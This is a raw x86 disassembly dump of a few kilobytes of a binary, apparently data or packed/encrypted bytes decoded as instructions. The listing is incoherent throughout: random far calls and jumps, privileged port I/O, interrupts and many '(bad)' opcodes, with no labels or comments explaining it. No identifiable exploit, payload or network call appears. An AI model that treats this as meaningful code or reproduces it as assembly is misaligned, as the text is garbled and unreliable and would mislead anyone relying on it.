  41bae9:	aas    
  41baea:	jo     0x41bb4c
  41baec:	cs stc 
  41baee:	pop    ss
  41baef:	outs   dx,DWORD PTR ds:[esi]
  41baf0:	adc    DWORD PTR [edx*2+0x7b58ad39],edx
  41baf7:	jmp    0x76605782
  41bafc:	pop    ds
  41bafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bafe:	push   ebp
  41baff:	push   cs
  41bb00:	mov    edx,0xb724ffa7
  41bb05:	ins    BYTE PTR es:[edi],dx
  41bb06:	xlat   BYTE PTR ds:[ebx]
  41bb07:	call   0x189d15cf
  41bb0c:	sti    
  41bb0d:	push   edx
  41bb0e:	mov    edi,0x4640d341
  41bb13:	dec    eax
  41bb14:	icebp  
  41bb15:	jb     0x41baf4
  41bb17:	jge    0x41bb55
  41bb19:	sub    DWORD PTR [ebp+0x15032cd0],ebx
  41bb1f:	jmp    0xd24916ab
  41bb24:	inc    ecx
  41bb25:	fimul  DWORD PTR [ebp+esi*2+0x7]
  41bb29:	out    0x3f,al
  41bb2b:	add    dh,bh
  41bb2d:	enter  0xf143,0xf1
  41bb31:	pop    edi
  41bb32:	sahf   
  41bb33:	dec    edx
  41bb34:	pop    ebx
  41bb35:	push   es
  41bb36:	cmc    
  41bb37:	push   esi
  41bb38:	inc    edi
  41bb39:	mov    eax,0xdcc6aff3
  41bb3e:	push   ebx
  41bb3f:	mov    ds:0xb38015b8,al
  41bb44:	outs   dx,BYTE PTR ds:[esi]
  41bb45:	cli    
  41bb46:	inc    ebp
  41bb47:	mov    ah,0x2a
  41bb49:	lea    eax,[esi]
  41bb4b:	in     eax,dx
  41bb4c:	push   ebx
  41bb4d:	cmp    al,0x50
  41bb4f:	mov    ebp,0x609df504
  41bb54:	jo     0x41bb4c
  41bb56:	jno    0x41bbc6
  41bb58:	out    0xc6,al
  41bb5a:	and    bl,BYTE PTR [ebx]
  41bb5c:	fdivr  DWORD PTR [edx+ebx*1]
  41bb5f:	mov    ebp,0x65f850c7
  41bb64:	push   eax
  41bb65:	pop    ds
  41bb66:	dec    DWORD PTR ds:0x7cd15990
  41bb6c:	push   esp
  41bb6d:	cmp    al,0x26
  41bb6f:	retf   0x82b4
  41bb72:	popf   
  41bb73:	inc    esi
  41bb74:	mov    al,0x79
  41bb76:	xchg   BYTE PTR [edx-0x14380691],bh
  41bb7c:	mov    dh,0x92
  41bb7e:	and    BYTE PTR [ecx-0x2e107c6c],ch
  41bb84:	cmp    cl,BYTE PTR [ebx-0x52]
  41bb87:	jmp    0x2d3ddb42
  41bb8c:	mov    DWORD PTR [esi-0x22],esi
  41bb8f:	mov    bh,bh
  41bb91:	cmp    al,0x3e
  41bb93:	xor    BYTE PTR [edi+0x58],0x3c
  41bb97:	mov    al,0x25
  41bb99:	in     al,0xe6
  41bb9b:	rcr    DWORD PTR [ebx-0x62c3b2b6],cl
  41bba1:	xor    ah,BYTE PTR [edi]
  41bba3:	mov    esp,0xddfef613
  41bba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bba9:	push   ebp
  41bbaa:	(bad)  
  41bbab:	push   eax
  41bbac:	rcr    ebx,1
  41bbae:	mov    ds:0x8b6b9f37,al
  41bbb3:	adc    edi,0x976d1521
  41bbb9:	lds    edx,FWORD PTR [ecx-0x76]
  41bbbc:	push   ecx
  41bbbd:	sbb    ch,BYTE PTR [edi]
  41bbbf:	inc    edi
  41bbc0:	clc    
  41bbc1:	mov    esp,0x49dcee90
  41bbc6:	push   edx
  41bbc7:	popf   
  41bbc8:	inc    edi
  41bbc9:	push   edi
  41bbca:	adc    esi,ebp
  41bbcc:	pop    eax
  41bbcd:	or     al,0x7c
  41bbcf:	sbb    DWORD PTR [eax],esi
  41bbd1:	dec    edi
  41bbd2:	xchg   edi,eax
  41bbd3:	clc    
  41bbd4:	dec    ecx
  41bbd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbd6:	rol    DWORD PTR es:[edi+0x7a],1
  41bbda:	in     al,dx
  41bbdb:	or     ebx,ebp
  41bbdd:	imul   ecx,esi,0xfffffffe
  41bbe0:	paddusw mm3,mm4
  41bbe3:	adc    dl,bl
  41bbe5:	jecxz  0x41bb9a
  41bbe7:	pop    ebx
  41bbe8:	repz pop ss
  41bbea:	pop    ecx
  41bbeb:	popa   
  41bbec:	or     eax,0xd36f286b
  41bbf1:	xor    al,0x6c
  41bbf3:	xchg   esi,eax
  41bbf4:	stos   BYTE PTR es:[edi],al
  41bbf5:	xor    edx,DWORD PTR [esi]
  41bbf7:	popa   
  41bbf8:	mov    ds:0xe0e35e6c,eax
  41bbfd:	pop    edx
  41bbfe:	mov    al,0xc1
  41bc00:	pop    ss
  41bc01:	pop    esp
  41bc02:	test   ebx,0x112c832
  41bc08:	jnp    0x41bbed
  41bc0a:	lods   al,BYTE PTR ds:[esi]
  41bc0b:	ins    BYTE PTR es:[edi],dx
  41bc0c:	push   ss
  41bc0d:	mov    bh,bl
  41bc0f:	bound  eax,QWORD PTR ds:0x4abbdb00
  41bc15:	loopne 0x41bbb9
  41bc17:	fadd   QWORD PTR [edx+0x18c4a68a]
  41bc1d:	pop    eax
  41bc1e:	jmp    0xebd5f452
  41bc23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc24:	test   DWORD PTR [edx],0xe11b1f7
  41bc2a:	and    cl,cl
  41bc2c:	pop    edx
  41bc2d:	mov    fs,WORD PTR [ecx-0x31]
  41bc30:	or     DWORD PTR [edx-0x5a6e8bbd],edi
  41bc36:	repz je 0x41bc2e
  41bc39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc3a:	hlt    
  41bc3b:	aad    0x5f
  41bc3d:	mov    edx,0x23bb996d
  41bc42:	repz push ebp
  41bc44:	test   eax,0xd63537e
  41bc49:	xor    DWORD PTR [ecx-0x6],esi
  41bc4c:	aas    
  41bc4d:	sub    BYTE PTR [edx+0x38],dl
  41bc50:	add    al,0x20
  41bc52:	push   edx
  41bc53:	es pop esi
  41bc55:	jp     0x41bc39
  41bc57:	es js  0x41bcd4
  41bc5a:	bound  edx,QWORD PTR [ebx-0x66]
  41bc5d:	push   0x3f767e62
  41bc62:	xor    BYTE PTR [edi],bh
  41bc64:	ret    0xfa7b
  41bc67:	add    edi,DWORD PTR [esi+0x51]
  41bc6a:	pop    esi
  41bc6b:	(bad)  
  41bc6c:	fidiv  WORD PTR [edi+0x17]
  41bc6f:	sub    eax,0xa5ddc6fa
  41bc74:	(bad)  
  41bc75:	mov    ds:0xd0986870,eax
  41bc7a:	in     al,0x29
  41bc7c:	repz dec ecx
  41bc7e:	data16 mov al,ds:0x8098a2fc
  41bc84:	ds push es
  41bc86:	stc    
  41bc87:	out    dx,eax
  41bc88:	sahf   
  41bc89:	fst    QWORD PTR [edi]
  41bc8b:	mov    al,ds:0x9c4ea057
  41bc90:	xchg   esp,eax
  41bc91:	xor    BYTE PTR [edi+0x2b24cc7],dl
  41bc97:	xchg   esp,eax
  41bc98:	imul   eax,DWORD PTR [ebx+0x0],0x0
	...
  41bd12:	add    BYTE PTR [eax],al
  41bd14:	in     eax,dx
  41bd15:	jle    0x41bd09
  41bd17:	ret    
  41bd18:	repz iret 
  41bd1a:	std    
  41bd1b:	jle    0x41bcfc
  41bd1d:	loope  0x41bd61
  41bd1f:	mov    al,0xe9
  41bd21:	inc    ebx
  41bd22:	adc    eax,0x15b63f0
  41bd27:	add    BYTE PTR [esi+0x7],ch
  41bd2a:	add    BYTE PTR [eax],al
  41bd2c:	icebp  
  41bd2d:	mov    DWORD PTR [edx],ebx
  41bd2f:	retf   
  41bd30:	ds pop edx
  41bd32:	add    eax,0x48fdc6d5
  41bd37:	mov    BYTE PTR [edi],bl
  41bd39:	mov    edi,0xe650713
  41bd3e:	fisub  WORD PTR [edx+0x3ce202f0]
  41bd44:	jl     0x41bd6e
  41bd46:	retf   0x424f
  41bd49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd4a:	add    esp,DWORD PTR [eax+ebp*8-0x34837426]
  41bd51:	fucomip st,st(7)
  41bd53:	in     eax,0xcc
  41bd55:	pop    ds
  41bd56:	ret    0x8a6
  41bd59:	mov    ecx,0x4959687a
  41bd5e:	mov    ecx,0xeab238e
  41bd63:	(bad)  
  41bd64:	jg     0x41bdd3
  41bd66:	cmp    ch,BYTE PTR [edi-0x3b7d986b]
  41bd6c:	pop    edx
  41bd6d:	retf   0x9ee1
  41bd70:	ret    0xfb66
  41bd73:	fist   WORD PTR [ecx-0x4c796728]
  41bd79:	push   edx
  41bd7a:	sub    dl,bl
  41bd7c:	adc    eax,0x9510088a
  41bd81:	jae    0x41bdae
  41bd83:	inc    ebp
  41bd84:	or     DWORD PTR [eax+0x4d],esi
  41bd87:	sub    BYTE PTR [edi-0x66],al
  41bd8a:	jge    0x41bd8b
  41bd8c:	mov    edx,0x7228f88
  41bd91:	cmp    al,0x5f
  41bd93:	es inc edi
  41bd95:	dec    edx
  41bd96:	dec    edi
  41bd97:	fbld   TBYTE PTR [ebx-0x75]
  41bd9a:	sub    DWORD PTR [edi*4+0x1f166fdc],esp
  41bda1:	xchg   esp,ebp
  41bda3:	lds    ebx,FWORD PTR [ebp+0x19]
  41bda6:	in     eax,0x9d
  41bda8:	inc    ebx
  41bda9:	stc    
  41bdaa:	sbb    DWORD PTR [edi],0xffffffdb
  41bdad:	(bad)  
  41bdae:	sbb    eax,0x36149e08
  41bdb3:	sbb    edx,esp
  41bdb5:	adc    ecx,DWORD PTR [eax-0x681dc1ff]
  41bdbb:	repz int 0xb9
  41bdbe:	imul   ebx,DWORD PTR ds:0x8b6ab60d,0x21
  41bdc5:	jmp    0xbe0ba8ba
  41bdca:	call   0x8767:0x2564a891
  41bdd1:	outs   dx,BYTE PTR ds:[esi]
  41bdd2:	or     eax,0xe4b24b92
  41bdd7:	mov    ds:0xac0d2dc3,al
  41bddc:	jnp    0x41bd6a
  41bdde:	shl    DWORD PTR [edi],cl
  41bde0:	and    ch,BYTE PTR [ebp+0x54]
  41bde3:	call   0x5436617d
  41bde8:	(bad)  
  41bde9:	lods   al,BYTE PTR ds:[esi]
  41bdea:	in     al,dx
  41bdeb:	pop    es
  41bdec:	les    ebp,FWORD PTR [ecx-0x1c]
  41bdef:	sub    BYTE PTR [eax+eax*1+0x2ef799f1],ch
  41bdf6:	sub    al,BYTE PTR [edx+0x674abc1b]
  41bdfc:	or     ecx,ecx
  41bdfe:	xor    DWORD PTR [eax],0x5fe31ba4
  41be04:	dec    ebp
  41be05:	fwait
  41be06:	lea    edx,[ecx-0x50]
  41be09:	jg     0x2d2db1d4
  41be0f:	pop    edi
  41be10:	inc    esp
  41be11:	fist   WORD PTR [edi+0x5a02f951]
  41be17:	dec    DWORD PTR [edx]
  41be19:	xor    ebx,DWORD PTR [edx+0x5d]
  41be1c:	sub    eax,esi
  41be1e:	and    BYTE PTR [ebx],ah
  41be20:	aas    
  41be21:	in     eax,0x3f
  41be23:	or     DWORD PTR [esi],0xffffffc3
  41be26:	jbe    0x41bdce
  41be28:	popf   
  41be29:	add    BYTE PTR gs:[ebp+0x568aff39],dl
  41be30:	arpl   WORD PTR [ebp-0x3942db0b],sp
  41be36:	cmp    esi,DWORD PTR [eax+0x1b18ede7]
  41be3c:	popf   
  41be3d:	fbstp  TBYTE PTR [esi-0x4ab4ddd9]
  41be43:	popa   
  41be44:	cmp    BYTE PTR ds:0xbb46daba,bl
  41be4a:	popa   
  41be4b:	sbb    al,BYTE PTR [esi+0x39]
  41be4e:	ins    DWORD PTR es:[edi],dx
  41be4f:	xchg   ebx,eax
  41be50:	pop    es
  41be51:	xchg   esi,eax
  41be52:	adc    BYTE PTR [ecx],ch
  41be54:	add    ch,BYTE PTR [ebx+edx*2-0x786781df]
  41be5b:	push   esp
  41be5c:	fbld   TBYTE PTR [edx-0x1540e10]
  41be62:	mov    dl,0xf7
  41be64:	das    
  41be65:	pop    ebx
  41be66:	mov    ecx,0xa8176b51
  41be6b:	dec    ebx
  41be6c:	push   edx
  41be6d:	loope  0x41bdf4
  41be6f:	or     al,0x97
  41be71:	fldenv [edx-0x13893edf]
  41be77:	enter  0xaa1a,0xf2
  41be7b:	cmp    esi,DWORD PTR [ebp-0x704f0eaa]
  41be81:	jnp    0x41be77
  41be83:	push   0xdfa602b9
  41be88:	inc    eax
  41be89:	scas   al,BYTE PTR es:[edi]
  41be8a:	pop    eax
  41be8b:	mov    cl,0x46
  41be8d:	repnz fisub DWORD PTR [ebp-0x5dfc5184]
  41be94:	cmp    eax,0xaa6135d3
  41be99:	jp     0x41be27
  41be9b:	loope  0x41bed8
  41be9d:	add    al,0xc
  41be9f:	jno    0x41be55
  41bea1:	jae    0x41be98
  41bea3:	popa   
  41bea4:	call   0x90c22e36
  41bea9:	enter  0xd45a,0x6d
  41bead:	mov    dh,ch
  41beaf:	xchg   ebx,eax
  41beb0:	jmp    0x41be9e
  41beb2:	mov    edi,0x63e9c5d
  41beb7:	xchg   ecx,eax
  41beb8:	rcr    DWORD PTR fs:[esi+edx*2+0xd],1
  41bebd:	cld    
  41bebe:	popa   
  41bebf:	and    al,0xf
  41bec1:	adc    al,0x41
  41bec3:	cmpxchg DWORD PTR [edx-0x5a],ecx
  41bec7:	call   0x3cf57f10
  41becc:	fmul   DWORD PTR [ebx-0x77]
  41becf:	test   al,0xbf
  41bed1:	pop    es
  41bed2:	mov    BYTE PTR [edi+0x39894530],dl
  41bed8:	inc    edx
  41bed9:	add    al,0x56
  41bedb:	jecxz  0x41bf1f
  41bedd:	adc    al,0x2a
  41bedf:	jno    0x41bed4
  41bee1:	xor    al,0x9c
  41bee3:	xor    edi,DWORD PTR [esi+esi*2+0x4526692]
  41beea:	(bad)  
  41beeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beec:	leave  
  41beed:	pop    esp
  41beee:	enter  0xd6e1,0x46
  41bef2:	dec    eax
  41bef3:	call   0x9dba08e
  41bef8:	cdq    
  41bef9:	sub    eax,0xb935addd
  41befe:	sahf   
  41beff:	pop    ebx
  41bf00:	inc    bh
  41bf02:	jecxz  0x41beda
  41bf04:	sti    
  41bf05:	sub    al,0xf0
  41bf07:	push   es
  41bf08:	aam    0xc7
  41bf0a:	stos   DWORD PTR es:[edi],eax
  41bf0b:	js     0x41bf38
  41bf0d:	aad    0x1d
  41bf0f:	xlat   BYTE PTR ds:[ebx]
  41bf10:	outs   dx,DWORD PTR ds:[esi]
  41bf11:	mov    eax,ds:0xecc1d2fa
  41bf16:	xor    ch,BYTE PTR fs:[ebx-0x27bb3e1f]
  41bf1d:	pop    edx
  41bf1e:	jno    0x41bf85
  41bf20:	jle    0x41befa
  41bf22:	and    BYTE PTR [edi],al
  41bf24:	inc    eax
  41bf25:	aam    0xcb
  41bf27:	mov    ds:0xa7cb94eb,al
  41bf2c:	sub    DWORD PTR [ecx],edx
  41bf2e:	fild   QWORD PTR [esp+ecx*2+0x65c24353]
  41bf35:	push   cs
  41bf36:	cmp    eax,0x42be935a
  41bf3b:	in     al,dx
  41bf3c:	aad    0xd9
  41bf3e:	out    0x7d,eax
  41bf40:	sub    ch,0xf1
  41bf43:	push   ds
  41bf44:	outs   dx,BYTE PTR ds:[esi]
  41bf45:	test   eax,0x7a458e91
  41bf4a:	in     al,0x54
  41bf4c:	sub    BYTE PTR [esi+0x17],al
  41bf4f:	cdq    
  41bf50:	inc    edi
  41bf51:	mov    esp,0x217148ac
  41bf56:	loop   0x41bf7a
  41bf58:	call   0x9473:0x55dbcb43
  41bf5f:	pop    ebx
  41bf60:	hlt    
  41bf61:	cmp    DWORD PTR [edi+0x2b],eax
  41bf64:	sub    BYTE PTR [edx+0x21ec6ec7],al
  41bf6a:	inc    ecx
  41bf6b:	ret    
  41bf6c:	sbb    ebp,DWORD PTR [ecx+edi*1-0x4773a728]
  41bf73:	add    al,0xab
  41bf75:	pop    ecx
  41bf76:	fbstp  TBYTE PTR [edi-0x26]
  41bf79:	or     DWORD PTR gs:[ebx],ebp
  41bf7c:	push   es
  41bf7d:	daa    
  41bf7e:	pusha  
  41bf7f:	cmp    cl,dl
  41bf81:	sub    eax,0x7261487c
  41bf86:	add    esp,DWORD PTR [edi-0x4ca89da8]
  41bf8c:	retf   0x314d
  41bf8f:	pop    edi
  41bf90:	and    dl,dh
  41bf92:	jnp    0x41bf7e
  41bf94:	mov    ecx,0x628b846c
  41bf99:	test   esp,ebp
  41bf9b:	sbb    BYTE PTR [esi+ebx*2+0xe2f5088],dh
  41bfa2:	mov    ebp,0x8cf93862
  41bfa7:	push   0x17cf4bbc
  41bfac:	int    0xf
  41bfae:	sub    DWORD PTR [edx-0x6a0a4044],edi
  41bfb4:	retf   
  41bfb5:	and    dh,ch
  41bfb7:	push   esi
  41bfb8:	push   ecx
  41bfb9:	mov    ecx,0x5edc74ed
  41bfbe:	mov    ebp,0x1a53c9ed
  41bfc3:	sti    
  41bfc4:	push   cs
  41bfc5:	iret   
  41bfc6:	jne    0x41c01c
  41bfc8:	sbb    al,cl
  41bfca:	outs   dx,BYTE PTR ds:[esi]
  41bfcb:	pop    ebx
  41bfcc:	std    
  41bfcd:	loope  0x41bf9c
  41bfcf:	ror    BYTE PTR ss:[ecx+0x7d],cl
  41bfd3:	xor    dl,BYTE PTR ds:0x13d26c92
  41bfd9:	mov    dl,0xed
  41bfdb:	xchg   ebx,eax
  41bfdc:	fdivr  st,st(3)
  41bfde:	mov    bl,BYTE PTR [edx-0xd1fa9c2]
  41bfe4:	adc    DWORD PTR ds:0xac1cb8fe,0x3f
  41bfeb:	es aad 0xb
  41bfee:	mov    al,ds:0xf7566a34
  41bff3:	mov    edx,0x52b544c8
  41bff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bff9:	mov    ecx,0xd061f576
  41bffe:	repnz and DWORD PTR [edx],edi
  41c001:	jo     0x41c016
  41c003:	cmp    esi,edx
  41c005:	sbb    al,dl
  41c007:	pop    ss
  41c008:	jecxz  0x41c069
  41c00a:	cdq    
  41c00b:	(bad)  
  41c00c:	jmp    0x9c490deb
  41c011:	idiv   ebx
  41c013:	jne    0x41bfd6
  41c015:	(bad)  [eax+0x35da19fc]
  41c01b:	mov    bl,0x58
  41c01d:	mov    dl,0x92
  41c01f:	xchg   ebp,eax
  41c020:	cs sub esi,eax
  41c023:	jmp    0x21177318
  41c028:	call   0xba84:0xa727d4b6
  41c02f:	aaa    
  41c030:	sbb    eax,0x79176d55
  41c035:	inc    esp
  41c036:	fidiv  WORD PTR [edx-0x5d4ffb9]
  41c03c:	inc    eax
  41c03d:	sbb    BYTE PTR [edx+0x21],ch
  41c040:	cmc    
  41c041:	(bad)  
  41c043:	sub    DWORD PTR [eax+0x3be64d29],ecx
  41c049:	add    al,0x3c
  41c04b:	aad    0x3a
  41c04d:	js     0x41c08b
  41c04f:	cwde   
  41c050:	mov    ebx,esi
  41c052:	sbb    eax,DWORD PTR [edx+edx*8-0x7a0320c5]
  41c059:	ja     0x41c0ab
  41c05b:	cwde   
  41c05c:	das    
  41c05d:	cmp    BYTE PTR [ebx+0x32],dl
  41c060:	test   eax,0x15903310
  41c065:	push   ecx
  41c066:	lods   al,BYTE PTR ds:[si]
  41c068:	repz sub DWORD PTR [ebx+edx*8],ecx
  41c06c:	mov    ecx,0x5eb31961
  41c071:	sbb    eax,0xad61fa3
  41c076:	push   ds
  41c077:	sub    edx,DWORD PTR [ecx]
  41c079:	or     ch,BYTE PTR [ecx]
  41c07b:	cmp    esi,DWORD PTR [ecx+0x2e]
  41c07e:	dec    BYTE PTR [ebx+0x4f]
  41c081:	daa    
  41c082:	dec    edx
  41c083:	inc    edi
  41c084:	adc    DWORD PTR [edi+0x43],esp
  41c087:	push   ds
  41c088:	jg     0x41c023
  41c08a:	lods   al,BYTE PTR es:[esi]
  41c08c:	imul   esp,DWORD PTR [eax+ebx*1-0x6c65d38c],0x7c329f9e
  41c097:	adc    ch,bl
  41c099:	xor    BYTE PTR [edi+eax*8+0x69],bh
  41c09d:	call   0xb673:0xdfc75b3d
  41c0a4:	popf   
  41c0a5:	in     eax,dx
  41c0a6:	(bad)  
  41c0a7:	mov    eax,0xcaeb5116
  41c0ac:	retf   0x6de0
  41c0af:	shl    esp,1
  41c0b1:	sub    cl,BYTE PTR [eax+0x60]
  41c0b4:	and    bl,BYTE PTR [edx+0x59]
  41c0b7:	pop    ecx
  41c0b8:	stos   DWORD PTR es:[edi],eax
  41c0b9:	stc    
  41c0ba:	push   ds
  41c0bb:	add    al,0x19
  41c0bd:	inc    ecx
  41c0be:	dec    ebx
  41c0bf:	into   
  41c0c0:	mov    esi,0x1981be0e
  41c0c5:	(bad)  
  41c0c6:	loopne 0x41c13f
  41c0c8:	test   DWORD PTR [ecx+0x3c],esi
  41c0cb:	push   ebp
  41c0cc:	sub    BYTE PTR [edi-0x5379359b],cl
  41c0d2:	pusha  
  41c0d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0d4:	dec    ebp
  41c0d5:	rcr    DWORD PTR [ebx+0x27],1
  41c0d8:	add    ah,BYTE PTR [edi-0x6d]
  41c0db:	jne    0x41c13a
  41c0dd:	add    BYTE PTR [edx-0x1e],al
  41c0e0:	call   0xd95359e
  41c0e5:	push   ds
  41c0e6:	pop    es
  41c0e7:	cmp    al,0x24
  41c0e9:	hlt    
  41c0ea:	xor    esi,DWORD PTR [ebp-0x60]
  41c0ed:	ins    DWORD PTR es:[edi],dx
  41c0ee:	icebp  
  41c0ef:	xor    BYTE PTR [ebp-0x4fce4eaf],ah
  41c0f5:	ss mov dh,0xcd
  41c0f8:	pop    esp
  41c0f9:	sbb    al,0x31
  41c0fb:	dec    esp
  41c0fc:	jg     0x41c156
  41c0fe:	gs push esi
  41c100:	ja     0x41c180
  41c102:	push   ecx
  41c103:	jae    0x41c09b
  41c105:	jb     0x41c121
  41c107:	mov    dl,0xe8
  41c109:	das    
  41c10a:	(bad)  
  41c10c:	(bad)  
  41c10d:	std    
  41c10e:	jecxz  0x41c0c1
  41c110:	jp     0x41c18d
  41c112:	pop    ecx
  41c113:	lea    esi,[esi+0x34]
  41c116:	fwait
  41c117:	fwait
  41c118:	sub    al,0x4f
  41c11a:	inc    ebp
  41c11b:	and    DWORD PTR [edi+0x1ca13a32],eax
  41c121:	mov    eax,ds:0x60d20c03
  41c126:	push   ecx
  41c127:	xchg   ebx,eax
  41c128:	bound  edx,QWORD PTR [ebp-0x8598829]
  41c12e:	sbb    esp,DWORD PTR ds:0x258a2485
  41c134:	mov    bh,0x7e
  41c136:	mov    bl,0xca
  41c138:	dec    esi
  41c139:	dec    ecx
  41c13a:	(bad)  
  41c13b:	je     0x41c160
  41c13d:	inc    esi
  41c13e:	pop    ebx
  41c13f:	sbb    BYTE PTR [ecx-0x44],ch
  41c142:	ja     0x41c10a
  41c144:	popa   
  41c145:	sbb    al,0x79
  41c147:	js     0x41c0e9
  41c149:	popa   
  41c14a:	pop    ecx
  41c14b:	or     al,0x24
  41c14d:	jno    0x41c15d
  41c14f:	mov    eax,0x2dc4672e
  41c154:	mov    al,ds:0x2a2e7bdf
  41c159:	sbb    edi,DWORD PTR [edi+eax*1]
  41c15c:	xor    dh,BYTE PTR [ecx]
  41c15e:	mov    dh,0xd6
  41c160:	loop   0x41c145
  41c162:	cmp    DWORD PTR [eax-0x5d55dbd5],ebp
  41c168:	hlt    
  41c169:	mov    esp,0x49670f05
  41c16e:	and    esi,esi
  41c170:	je     0x41c1e7
  41c172:	out    0x45,al
  41c174:	cmp    al,0xa2
  41c176:	sar    BYTE PTR [edx+0x6],0xeb
  41c17a:	jmp    DWORD PTR [ebp-0x41]
  41c17d:	js     0x41c1df
  41c17f:	ins    BYTE PTR es:[edi],dx
  41c180:	lods   al,BYTE PTR ds:[esi]
  41c181:	jp     0x41c1f1
  41c183:	imul   BYTE PTR [ecx]
  41c185:	or     BYTE PTR [ebx],ah
  41c187:	lods   al,BYTE PTR ds:[esi]
  41c188:	pop    esp
  41c189:	div    dh
  41c18b:	iret   
  41c18c:	mov    dh,0xe6
  41c18e:	add    eax,DWORD PTR [esi+0x1d]
  41c191:	mov    bh,bl
  41c193:	test   BYTE PTR [esi+0x3af18a37],al
  41c199:	out    dx,eax
  41c19a:	cmp    al,BYTE PTR [ecx]
  41c19c:	dec    ebp
  41c19d:	jb     0x41c15e
  41c19f:	and    DWORD PTR [esi-0x5a9e7bd5],ebp
  41c1a5:	xor    al,0xfb
  41c1a7:	mov    BYTE PTR [ebx+0x5],ah
  41c1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1ab:	mov    al,ds:0xec33082f
  41c1b0:	push   cs
  41c1b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1b2:	ret    
  41c1b3:	and    DWORD PTR [ebx],esi
  41c1b5:	xchg   edx,eax
  41c1b6:	xor    DWORD PTR [eax+eax*8+0x745c379e],edx
  41c1bd:	shl    BYTE PTR [eax+0x52284d0c],0xf2
  41c1c4:	rol    BYTE PTR [ebx+0x6065f5ca],cl
  41c1ca:	ds jle 0x41c154
  41c1cd:	clc    
  41c1ce:	es push ebp
  41c1d0:	mov    esi,0x1874a94
  41c1d5:	in     al,0xa6
  41c1d7:	call   0xdae7:0x93b2ba14
  41c1de:	call   0x65f8:0x906f1ad0
  41c1e5:	jno    0x41c1a1
  41c1e7:	arpl   WORD PTR [ebx+0x7566c578],bp
  41c1ed:	ds inc ebx
  41c1ef:	or     BYTE PTR [ebx+0x63],cl
  41c1f2:	push   es
  41c1f3:	xchg   ah,bl
  41c1f5:	fst    QWORD PTR [ebp+0x311d813e]
  41c1fb:	push   es
  41c1fc:	sar    BYTE PTR [edi-0x6b54199],1
  41c202:	add    BYTE PTR [ebp-0x45],0x49
  41c206:	out    0xbf,eax
  41c208:	pop    ebp
  41c209:	je     0x41c1b2
  41c20b:	sbb    bl,bl
  41c20d:	cmp    BYTE PTR [ebx+edi*1-0x76],bh
  41c211:	push   cs
  41c212:	ja     0x41c205
  41c214:	clc    
  41c215:	xor    ebp,DWORD PTR [ebx]
  41c217:	(bad)
  41c21a:	in     al,dx
  41c21b:	add    eax,0xf0754204
  41c220:	sbb    dh,BYTE PTR [ebx-0x510f8728]
  41c226:	stos   DWORD PTR es:[edi],eax
  41c227:	add    dl,dh
  41c229:	mov    BYTE PTR [edi-0x49],cl
  41c22c:	push   edx
  41c22d:	or     BYTE PTR [edx],dh
  41c22f:	pop    esp
  41c230:	les    edx,FWORD PTR [eax-0x59d8b8b9]
  41c236:	mov    dl,0xe3
  41c238:	cs xor bl,cl
  41c23b:	mov    esp,0x4844af3
  41c240:	leave  
  41c241:	out    dx,al
  41c242:	lahf   
  41c243:	xor    BYTE PTR [eax],dh
  41c245:	das    
  41c246:	xchg   edx,eax
  41c247:	int    0x49
  41c249:	outs   dx,DWORD PTR ds:[esi]
  41c24a:	cmc    
  41c24b:	(bad)  
  41c24c:	retf   0xdfe3
  41c24f:	outs   dx,BYTE PTR ds:[esi]
  41c250:	jp     0x41c1f8
  41c252:	sub    eax,0xdc41acfb
  41c257:	mov    ah,BYTE PTR [edi-0x1746e6b5]
  41c25d:	lock scas al,BYTE PTR es:[edi]
  41c25f:	or     ecx,DWORD PTR [ecx+0x27]
  41c262:	push   ss
  41c263:	pop    eax
  41c264:	sub    BYTE PTR [edi+esi*1+0x552fb044],ch
  41c26b:	mov    ebp,ds
  41c26d:	cmp    ah,BYTE PTR [edi]
  41c26f:	add    esi,DWORD PTR [edi]
  41c271:	cwde   
  41c272:	lock popf 
  41c274:	pushw  0xffc8
  41c277:	iret   
  41c278:	sub    al,ch
  41c27a:	iret   
  41c27b:	cdq    
  41c27c:	je     0x41c2f8
  41c27e:	scas   al,BYTE PTR es:[edi]
  41c27f:	mov    edx,0xafe07f2e
  41c284:	dec    esi
  41c285:	pop    esi
  41c286:	inc    edi
  41c287:	pop    esp
  41c288:	scas   al,BYTE PTR es:[edi]
  41c289:	adc    ebx,DWORD PTR [eax]
  41c28b:	xlat   BYTE PTR ds:[ebx]
  41c28c:	push   ebx
  41c28d:	pop    esi
  41c28e:	lods   eax,DWORD PTR ds:[esi]
  41c28f:	dec    edx
  41c290:	int    0x1c
  41c292:	xor    esi,DWORD PTR ds:[ebp-0x4aaabd9c]
  41c299:	adc    ebp,DWORD PTR [edx+0x55369b59]
  41c29f:	inc    eax
  41c2a0:	dec    eax
  41c2a1:	xchg   edi,eax
  41c2a2:	mov    WORD PTR [eax-0x63844547],?
  41c2a8:	pop    ebx
  41c2a9:	add    al,0xf4
  41c2ab:	sbb    al,0xb8
  41c2ad:	pop    esi
  41c2ae:	ffreep st(6)
  41c2b0:	cmp    edi,DWORD PTR [edi-0x7d]
  41c2b3:	aad    0x68
  41c2b5:	push   0xa90d78a7
  41c2ba:	mov    bl,0xda
  41c2bc:	repz mov ch,0x5c
  41c2bf:	sbb    ebx,ebx
  41c2c1:	xor    BYTE PTR [ebx-0x7156a8d3],bl
  41c2c7:	jle    0x41c296
  41c2c9:	scas   eax,DWORD PTR es:[edi]
  41c2ca:	aaa    
  41c2cb:	out    dx,eax
  41c2cc:	push   es
  41c2cd:	mov    edx,0x19102828
  41c2d2:	lds    edi,FWORD PTR ds:0x7a07abd1
  41c2d8:	xchg   esi,eax
  41c2d9:	xor    al,0x5e
  41c2db:	or     dl,ah
  41c2dd:	xchg   edx,eax
  41c2de:	dec    ebx
  41c2df:	cmp    edx,DWORD PTR [eax]
  41c2e1:	cli    
  41c2e2:	adc    eax,0xb7c2a41a
  41c2e7:	mov    ecx,0x59221973
  41c2ec:	scas   al,BYTE PTR es:[edi]
